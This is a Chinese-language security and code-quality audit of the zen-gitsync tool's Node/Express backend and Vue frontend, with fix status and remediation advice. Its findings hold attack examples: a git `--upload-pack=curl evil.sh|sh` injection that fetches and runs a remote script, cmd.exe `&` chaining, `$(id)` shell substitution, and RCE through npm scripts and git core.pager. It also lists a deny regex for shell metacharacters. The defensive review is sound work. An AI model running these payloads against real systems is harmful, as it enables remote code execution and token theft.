# zen-gitsync 代码审查报告

- 版本：v2.16.32
- 日期：2026-08-29
- 范围：src/ 全量（CLI + Express 后端 + Vue3 前端）+ scripts/
- 方式：静态代码审查，未修改任何文件

## 关键量化指标

| 指标 | 数值 |
|---|---|
| 后端非测试源文件 | 52 个 |
| 后端测试文件 | 14 个（文件维度覆盖 26%） |
| **零测试的后端代码** | **16924 行** |
| 前端 `addEventListener` / `removeEventListener` | 60 / 51（缺 9） |
| 前端 `setInterval` | 15 处 |
| 前端 `: any` / `as any` | 281 / 144 |
| 前端 `watch(..., {deep:true})` | 15 处 |
| 前端 `@ts-ignore` | 0（很好） |
| 请求带 `AbortController` | 仅 4 处（AI 相关），业务请求几乎全无 |

---

## 修复进度（第三轮，2026-08-29 更新）

| 项 | 状态 | 说明 |
|---|---|---|
| P0-1 监听收敛 | ✅ 已修 | 默认 `127.0.0.1`，`ZEN_HOST` 可放开 |
| P0-5 fs.js shell 引号 | ✅ 已修 | 改用 `shQuote()` |
| P0-7 git 参数注入 | ✅ 已修 | `gitArgs.js` 收口 **17 个注入点**（第三轮发现 gitOps 之外还有 8 个） |
| P0-8 git config 白名单 | ✅ 已修 | key 白名单 + value 禁换行（防绕过）+ `ZEN_GIT_CONFIG_ALLOWED_KEYS` 可追加 |
| P0-9（新增）跨站请求守卫 | ✅ 已修 | `middleware/originGuard.js`，覆盖全部 `/api` |
| P1-9 / P1-10 / P1-12 崩溃 | ✅ 已修 | 第一轮记录 |
| config.js 降级 bug（新发现） | ✅ 已修 | 降级写成功却 throw → 数据已落盘但前端报 500 |
| P0-2 exec.js win32 分支 | ⏳ 待定 | 需确认 `dir`/`type` 等内置命令的取舍 |
| **P0-3 / P0-6 路径守卫** | ❌ **建议不改** | 见下方修正 |
| P0-4 fileOpen.js | ⏳ 部分缓解 | Origin 守卫已覆盖跨站入口 |

### 第三轮：真实验证结果

**数据级回归（防误拒）**：用 zen-git 真实仓库数据过校验函数——分支名（含中文）、300 个
commit hash、249 个 tag、remote 名/URL、**全量 1764 个文件路径**、短 hash，合计 2824 条
零误拒；`HEAD`/`main`/`--upload-pack=x` 等非法值全部正确拒绝。

**端到端 API 测试**（临时 git 仓库含中文分支名 + 真实服务 + curl）：

| 接口 | 正常输入 | 攻击载荷 |
|---|---|---|
| `/api/log`（中文分支名） | 200 | 400 |
| `/api/commit-files` / `commit-diff-full` | 200 | 400 |
| `/api/git-file-content`（rev=HEAD / hash / `:` 三形态） | 200 | 400 |
| `/api/git/global-config`（白名单内回写，配置实测未被改变） | 200 | 400（core.pager / alias.st / value 带换行） |
| `/api/add-remote`（ext:: 未写入 .git/config） | 200 | 400 |
| `/api/push-tag` / `delete-tag` / `checkout` / `create-branch` | 200 | 400 |
| `/api/stash-apply` / `drop` / `files` | 200 | 400 |
| `/api/commit-file-content`（`..` 上跳） | 200 | 400 |

端到端还揪出两类单元测试发现不了的问题：3 个路由的 catch 吞掉 HttpError(400) 成 500；
`/api/commit-file-diff` 是 grep 复查时新发现的注入点（hash 在 `--` 之前）。

**教训**：验证前必须核对「服务进程启动时间 vs 文件修改时间」——一次重启因 `taskkill`
参数错误静默失败，新进程 EADDRINUSE 顺延到别的端口，5901 上一直是旧进程，
导致一轮复验结果全错（攻击载荷"返回 200"实为旧代码行为）。

### 对原报告的修正：P0-3 与 P0-6 不能照做

审查时建议给 `npm.js` 的 `packagePath`、`fs.js` 的 `/api/browse_directory` 加 `ensureWithinCwd`。
**深入核查后发现这会直接废掉两个核心功能**：

- `src/ui/client/src/components/DirectorySelector.vue:547` —— `/api/browse_directory` 服务的就是**切换工作目录**，用户要靠它浏览并切到别的项目
- `src/ui/client/src/components/PackageJsonSelector.vue:110` —— 用户要靠它选择**任意项目**的 `package.json`

跨目录访问是这个工具的设计意图，不是缺陷。通用 Web 服务的加固套路在这里不适用。

**替代方案**：改用 Origin 守卫（P0-9）。它不碰功能语义，却能用一条中间件覆盖包括这两个接口在内的全部 `/api`——监听收敛后剩下的主要入口就是跨站调用与 DNS rebinding，正好对症。

---

## P0 — 安全暴露面（8 项）

> 先做第 1 条：把监听收敛到 127.0.0.1，一条就能把其余所有 RCE 的暴露面从局域网压回本机。

### 1. 服务绑定 0.0.0.0 + 全站零认证

`src/ui/server/utils/startServerOnAvailablePort.js:59`

```js
httpServer.listen(currentPort, () => {   // 未传 host → 绑定 0.0.0.0 / ::
```

`src/ui/server/index.js` 全程无 auth 中间件（仅 Socket.IO 做了 origin 收敛）。`/api/exec-stream`、`/api/add-npm-script` 等全部裸奔，同网段任何主机可直接调用。
**改**：`httpServer.listen(currentPort, '127.0.0.1', cb)`，并加 token 中间件（非 `/api/health` 一律校验 `x-zen-token`）。

### 2. exec.js 的「不走 shell」在 Windows 上不成立

`src/ui/server/routes/exec.js:87-90`

```js
if (process.platform === 'win32' && WIN_CMD_BUILTINS.has(head.toLowerCase())) {
  // 内置命令通过 cmd /c 调用,argv 数组传入,不会走 shell 解析
  return { bin: 'cmd.exe', args: ['/c', ...tokens] };
}
```

Node 在 Windows 上会把 argv 用空格拼成命令行字符串，`cmd.exe` 会二次解析。`splitCommandArgs` 按空白/引号切分后，`&`、`|` 成为独立 token 原样传入。实测 `spawn('cmd.exe',['/c','echo','AAA','&','echo','BBB'])` 两条都执行。**注释是错的**。
`src/ui/server/socket/registerUiSocketHandlers.js:181` 同一模式。
**改**：删除内置命令分支（内置命令直接实现或走首 token 分支），并在 token 层拒绝 `/[&|;<>()%^!]/`。

### 3. npm.js 路径无校验 + 脚本任意写 = 存储型 RCE

`src/ui/server/routes/npm.js:1212-1245`

```js
let packageJsonPath = path.resolve(packagePath);          // 无 ensureWithinCwd
const packageJson = JSON.parse(fsSync.readFileSync(packageJsonPath, 'utf8'));
packageJson.scripts[scriptName] = scriptCommand;          // scriptCommand 任意
fsSync.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2) + '\n', 'utf8');
```

`/api/add-npm-script`、`/api/update-npm-script`、`/api/version-bump:466`、`/api/read-package-json:420` 同源。写入的 `scripts` 随后经 `/api/run-npm-script:1070` 的 `cmd /k npm run <name>` 执行 → 完整 RCE。
**改**：`ensureWithinCwd()` 校验 + `scriptName` 匹配 `/^[a-zA-Z0-9_:-]+$/`（run 接口已有，写接口缺失）。

### 4. `/api/open-file` 任意文件用系统关联程序打开

`src/ui/server/routes/fileOpen.js:437-460`

```js
targetFilePath = path.resolve(process.cwd(), filePath);   // 无 pathGuard
await open(targetFilePath);
```

绝对路径输入直接穿透；`.exe/.bat/.ps1` 会被**执行**。`open-with-vscode:515`、`open-directory-with-vscode:593` 同理。
**改**：加 `ensureWithinCwd()` + 可执行扩展名黑名单。

### 5. fs.js 用 `JSON.stringify` 当 shell 引号

`src/ui/server/routes/fs.js:441`

```js
{ cmd: 'xterm', args: ['-e', 'bash', '-c', `cd ${JSON.stringify(directoryPath)} && exec $SHELL`] },
```

`JSON.stringify('/tmp/$(id)')` → `"/tmp/$(id)"`，`$` 与反引号未转义，bash 双引号内仍展开。项目已有正确的 `utils/shellQuote.js` 的 `shQuote()` 却未使用。

### 6. fs.js 三个目录接口完全无路径校验

`src/ui/server/routes/fs.js:245 / 300 / 381`

```js
const directoryPath = req.query.path || process.cwd();   // → 直接 fs.readdir
```

任意目录枚举（用户名、项目结构、密钥文件名）。三者统一加路径守卫。

### 7. gitOps.js git 参数注入

`src/ui/server/routes/gitOps.js:349`

```js
const { stdout } = await execGitCommand(['push', '-u', 'origin', branch]);
```

`branch` 未校验且不以 `--` 分隔。传 `--upload-pack=curl evil.sh|sh` → git 自身执行该命令 → RCE。
同类：`reset --hard:901`、`show <spec>:951/1056/1083`、`revert:1117`、`reset --hard <hash>:1177`。
**改**：`branch` 用 `/^[A-Za-z0-9._\/-]+$/` 且拒绝 `-` 开头；hash 用 `/^[0-9a-f]{7,40}$/`；所有 pathspec 前插 `--`。

### 8. git 全局配置任意读写 → token 泄露 + RCE

`src/ui/server/routes/gitOps.js:365 / 396`

```js
await execGitCommand(['config', '--global', '--get', key], { log: false });
await execGitCommand(['config', '--global', key, trimmed]);
```

读 `http.https://github.com/.extraheader` 会把 `AUTHORIZATION: basic <PAT>` 原样回给前端。写侧可设 `core.editor` / `core.pager`，后续 `git commit`（不带 -m）即触发执行。
**改**：key 白名单 `['user.name','user.email','core.autocrlf','credential.helper']`。

---

## P1 — 崩溃与稳定性（4 项）

### 9. npm.js NDJSON 流无异常保护 → 整服务退出

`src/ui/server/routes/npm.js:165-198`

```js
const send = (obj) => { res.write(JSON.stringify(obj) + '\n') };   // 无 try/catch
child.stdout.on('data', (buf) => send({ type:'stdout', ... }));
```

客户端断开后 `res.write` 抛 EPIPE，异常从 `'data'` 监听器冒泡 → `uncaughtException` → `index.js:166` 的 `fatalExit` → **整个服务退出**。且无 `req.on('close')`，进程锁直到子进程结束才释放。
**改**：照抄 `exec.js:171-179` 的 `sendData`（已有 try/catch）+ `req.on('close')` kill 子进程。

### 10. gitOps.js SSE 无 close 处理

`src/ui/server/routes/gitOps.js:405` `/api/push-with-progress`：`res.flushHeaders()` 后无 `req.on('close')`，`sendProgress` 无 try/catch → 同 EPIPE 崩溃路径。照 `exec.js:282-296` 补。

### 11. `process.chdir()` 改进程级全局 cwd，无锁

`src/ui/server/routes/fs.js:143`：切目录直接 `process.chdir(safeReqPath)`。期间并发的 `/api/editor/file`、`execGitCommand`（经 `utils/index.js:225 getCwd()`）会解析到错误目录。
**改**：去掉 `process.chdir`，只用 `currentProjectPath` 变量 + 所有 spawn/execFile 显式传 `cwd`。

### 12. npm.js `res.json()` 重复调用

`src/ui/server/routes/npm.js:1095` 与 `1102` 连续两次 `res.json()` → `ERR_HTTP_HEADERS_SENT`，catch 里再 `res.status(500).json()` 继续抛。删掉第二处（还多返回了未校验的 `packagePath`）。

---

## P2 — 性能与资源（7 项）

### 13. 同步阻塞 API 在请求路径上

- `fileOpen.js:40/290/311/356/366` `spawnSync`；其中 `findZCodeExecutable` 对 3 个注册表根做 `reg.exe query <root> /s`（全量递归，单次可达数秒）×3 次同步执行，`/api/check-tools:783` 直接阻塞事件循环。
- `npm.js:1144/1226/1290/1351/1409` 全部 `fsSync.readFileSync/writeFileSync`。
- `fs.js:903` `execSync(probe)`。

**改**：改 `fs/promises` + promisify 的 `execFile`；`reg.exe /s` 结果按进程缓存（10 分钟 TTL）。

### 14. 前端模板内直接调用 `flattenTree()`

`src/ui/client/src/views/EditorView.vue:1159`

```vue
<template v-for="node in flattenTree(visibleTree)" :key="node.path">
```

非 computed，任何无关响应式变化（搜索输入、tab 切换、轮询）都触发 O(n) 递归 + 全量 DOM diff。大仓库全展开可达数千节点。
**改**：`const flatNodes = computed(() => flattenTree(visibleTree.value))`。

### 15. LogList 无限累加 + 无虚拟滚动

`src/ui/client/src/views/components/LogList.vue:240`

```ts
logs.value = logs.value.concat(result.data as LogItem[])
```

`el-table`（1295 行）无虚拟滚动，滚动到底自动 `loadMoreLogs()`（777 行），几千条提交即渲染上万 DOM 节点且永不释放。
**改**：换 `el-table-v2` 或保留最近 500 条窗口。

### 16. MonacoEditor 9 个 addEventListener，0 个清理

`src/ui/client/src/components/MonacoEditor.vue:175/215/219/230/234/250/254/266/270`。`onBeforeUnmount`（649 行）只 dispose 了 Monaco disposable，DOM 监听器全泄漏，编辑器页反复进出成倍累积。
**改**：用 `AbortController` 的 signal 统一注册，`onBeforeUnmount` 里 `ac.abort()`。

### 17. 三处 deep watch 开销（改动小、收益高）

- `LogList.vue:838-844`：deep watch 整个 logs 数组，但**回调体是空的**（注释说"图表视图逻辑已移除"）。直接删。
- `FileDiffViewer.vue:243`、`GitStatus.vue:867`：`watch(filteredFiles, ..., {deep:true})` → `updateTreeData()` 递归重建整棵树，文件轮询每次都跑。改 shallow watch 或签名比对。
- `configStore.ts:735`：拖拽布局时每帧 deep 遍历 + 整表序列化落盘。改在 `mouseup` 时手动保存一次。

### 18. 后台标签页仍在轮询

`stores/monitorStore.ts:142`、`toolsStore.ts:83` 的 `setInterval` 无 `document.hidden` 判断；`instancesStore.ts:165` 和 `EditorView.vue:120` 已做。
**改**：抽 `useVisibilityPolling` composable 统一三处。

### 19. 业务请求全局无 AbortController → 后发先至覆盖

`gitStore.ts:776` 等全部 `fetch` 裸调。快速切目录/切分支时旧的慢请求后到会覆盖新数据。
**改**：封装带 signal 的 request 工具，切目录时 abort 在途请求。

---

## P3 — 工程化（5 项）

### 20. 测试覆盖严重不足

`scripts/run-tests.cjs` 扫描 `test/`、`src/utils`、`src/cli`、`src/ui/server` 四个目录。
但 **16924 行后端代码零测试**，包括全部高危核心：

```
gitOps.js 1377 行   npm.js 1450 行   workbench/index.js 1670 行
config.js 1226 行   codeAnalysis.js 1028 行   fs.js 928 行
fileOpen.js 802 行  exec.js 312 行   terminal.js 318 行   monitor.js 355 行
```

**建议优先级**：`pathGuard` / `shellQuote`（已有）→ `exec.js` 的 `resolveBinAndArgs` → `gitOps.js` 参数校验 → `npm.js` 路径校验。这几个正好是 P0 修复的验收测试。

### 21. 巨型文件拆分

| 文件 | 行数 | 拆分维度 |
|---|---|---|
| `WorkbenchView.vue` | 4150 | 任务列表 / 任务详情 / 执行日志 |
| `CommandConsole.vue` | 4078 | 命令输入区 / 会话列表 / 输出面板 |
| `FileDiffViewer.vue` | 2681 | diff 渲染 / 文件树 / AI 摘要 |
| `GitStatus.vue` | 2556 | 筛选栏 / 列表 / 右键菜单 |
| `gitStore.ts` | 2450 | 按 git 子命令拆 domain store |
| `LogList.vue` | 2250 | 筛选栏 / 列表 / 详情 |
| `App.vue` | 1814 | 拖拽 resize 抽 `useSplitResize`（461-565 行两套几乎相同的 v/h 实现） |

后端同理：`gitOps.js` / `npm.js` / `config.js` 建议按路由域拆分。

### 22. 依赖冗余

- **`socket.io-client` 应移出根 `package.json` 的 dependencies**：grep 确认只被 `src/ui/client/src/**` 引用（CommandConsole.vue:34、instancesStore.ts:17、gitStore.ts:19），而它已在 `src/ui/client/package.json` 中。当前会随 npm 包分发给所有用户。
- `local-file-picker` / `ai-model-form` 只被 `src/ui/server/index.js:57-58` 使用，却同时列在 client 的 dependencies 中，需确认是否冗余。
- `pdf-parse` 保留：`workbench/pdfText.js:56` 动态 import，懒加载合理。
- `src/ui/client/node_modules` 已正确 gitignore。

### 23. fs.js 7 个编辑器路由未包 asyncRoute

`fs.js:740/756/777/796/816/838/882` 均为 `async (req,res)` + 内层 `catch { res.status(500) }`，导致 `throw new HttpError(403,'禁止写入工作目录以外的文件')` 被吞成 500 且语义丢失。
**改**：包 `asyncRoute()` 并删除内层 try/catch。

### 24. 其它小项

- `terminal.js:154` `terminalSessions` Map 无上限，仅 `?cleanup=true` 才回收。
- `code.js:160` 每请求一个 64MB worker，无并发信号量 → 并发 DoS。
- `gitOps.js:58` 临时文件名 `commit-msg-${Date.now()}.txt` 可预测 + 无 `mode:0o600` → TOCTOU。
- `gitOps.js:1210` `/api/remove-lock` 无条件删 `.git/index.lock`，绕过 `checkAndClearGitLock` 的 PID liveness 校验 → 并发 git 时索引损坏。
- `middleware/requestLogger.js:45` 记录完整 `req.url`，含 `?path=C:\Users\...` 等敏感 query。改记 `req.path` + query 截断。
- `utils/index.js:305` git stdout 全量打屏，token 不会脱敏。建议加 `(sk-|ghp_|AKIA)[A-Za-z0-9]{10,}` 正则脱敏。

---

## 明确安全、勿重复排查

审查中已验证以下模块**实现正确**，后续不必再花时间：

- `utils/pathGuard.js` 的 `ensureWithinCwd` **无前缀陷阱**——86-91 行的 `path.relative` 判定优先且更严格，94-99 行的 `startsWith` 只是冗余纵深防御（方向安全：只可能误拒，不可能误放）。
- `utils/shellQuote.js` 三个转义函数（`shQuote` / `psEscape` / `appleEscape`）实现正确。
- `terminal.js` 的 macOS(120) 与 Linux(131) 分支转义正确，Windows 分支 `psEscape` 已覆盖全部元字符。
- `routes/code.js` 的 worker_threads 沙箱设计合格——`codeGeneration:{strings:false,wasm:false}` 阻断了 `Function()` / `eval` 逃逸，未注入 `require`。仅缺并发上限。
- `monitor.js` 全程 `execFile`（无 shell）+ argv 数组 + pid 校验 + 自 PID 保护。
- `mindmap.js` 的 `validatePath`(96) 用 `path.relative` 判定并禁磁盘根，扩展名有限定。
- `asyncRoute.js` + `errorHandler.js` 覆盖了 `HttpError.statusCode` / SyntaxError 400 / `headersSent` 三态。
- `index.js:144` 的 `setupGlobalErrorHandlers` 有幂等保护 + 子进程 drain，设计到位（但正因如此，P1 第 9 条的 EPIPE 会主动把服务杀掉）。
- **分层干净**：CLI 侧仅 `gitCommit.js:41` 动态 import UI server（懒加载，合理），无其它跨层依赖。

---

## 建议执行顺序

1. **第 1 条**（绑 127.0.0.1）—— 一行改动，收敛全部 RCE 暴露面
2. **第 2、3 条** —— 命令注入与任意文件写
3. **第 4~8 条** —— 路径穿越与 git 参数注入
4. **第 9、10 条** —— 崩溃路径（照抄 exec.js 已有写法，成本低）
5. **第 17 条** —— 三处 deep watch，改动小收益高
6. **第 20 条** —— 给刚修的 P0 项补测试，防止回归
7. 其余按排期推进
